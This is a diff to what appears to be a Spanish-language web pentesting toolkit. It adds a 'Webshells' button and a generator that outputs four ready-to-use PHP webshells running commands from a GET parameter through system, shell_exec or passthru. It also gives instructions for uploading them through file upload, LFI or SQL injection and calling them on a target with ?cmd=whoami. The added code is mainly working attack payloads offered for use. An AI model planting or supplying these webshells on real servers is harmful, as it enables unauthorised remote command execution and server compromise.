@@ -1789,6 +1789,20 @@ export TERM=xterm-256color</pre>
   </div>
 </div>
 
+<!-- WEBSHELL MODAL -->
+<div class="overlay" id="webshellModal">
+  <div class="modal" style="max-width:640px;width:96vw;">
+    <h3>🕸 Generador de webshells (PHP)</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Fichero que subes al servidor (upload, LFI, escritura por SQLi…) y ejecuta comandos por HTTP. Guárdalo como <code style="color:var(--orange)">shell.php</code>.</p>
+    <label>Nombre del parámetro</label>
+    <input type="text" id="webshellParam" value="cmd" oninput="renderWebshell()" placeholder="cmd">
+    <div id="webshellBody" style="margin-top:6px;"></div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('webshellModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
 <!-- REPORT MODAL -->
 <div class="overlay" id="reportModal">
   <div class="modal" style="max-width:860px;width:97vw;max-height:90vh;display:flex;flex-direction:column;">
@@ -4532,6 +4546,7 @@ function renderWebVulnList(){
   <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:16px;">
     <span style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);">Arsenal</span>
     <a href="https://www.revshells.com/" target="_blank" class="wv-arsenal-btn" style="text-decoration:none;">🔌 Reverse shells ↗</a>
+    <button class="wv-arsenal-btn" onclick="openWebshellModal()">🕸 Webshells</button>
     <button class="wv-arsenal-btn" onclick="openShellStabModal()">🐚 Estabilizar shell</button>
     <button class="wv-arsenal-btn" onclick="openDictModal()">📚 Diccionarios / polyglots</button>
   </div>
@@ -4645,6 +4660,26 @@ function renderSqliGen(){
     ? `<div class="enum-note" style="margin-bottom:8px;">Prueba estos para saber el motor. Cuando lo identifiques, selecciónalo arriba en «Motor de BD» y las demás categorías se adaptan a su sintaxis.</div>`
     : '';
   out.innerHTML=head+sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+}
+
+// ─── Generador de webshells PHP (parámetro editable) ──────────────────────────
+function openWebshellModal(){
+  renderWebshell();
+  document.getElementById('webshellModal').classList.add('show');
+  const _wm=document.querySelector('#webshellModal .modal'); if(_wm) _wm.scrollTop=0;
+}
+function renderWebshell(){
+  const param=((document.getElementById('webshellParam')?.value)||'cmd').trim()||'cmd';
+  const shells=[
+    {code:`<?php system($_GET['${param}']); ?>`, d:'Básico — ejecuta el comando y muestra la salida'},
+    {code:`<?php echo shell_exec($_GET['${param}']); ?>`, d:'Con shell_exec — útil si system está deshabilitado'},
+    {code:`<?php if(isset($_GET['${param}'])){echo "<pre>".shell_exec($_GET['${param}'])."</pre>";} ?>`, d:'Con comprobación y salida en <pre> (más legible)'},
+    {code:`<?php passthru($_GET['${param}']); ?>`, d:'Con passthru — otra alternativa si las demás están filtradas'},
+  ];
+  const out=document.getElementById('webshellBody');
+  if(!out) return;
+  out.innerHTML=`<div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin:8px 0 6px;">Cómo usarlo: súbelo como shell.php y visita <span style="color:var(--orange)">http://objetivo/ruta/shell.php?${esc(param)}=whoami</span></div>`
+    +shells.map(s=>wvPayloadCard(s.code,s.d)).join('');
 }
 
 function openWebVuln(id){
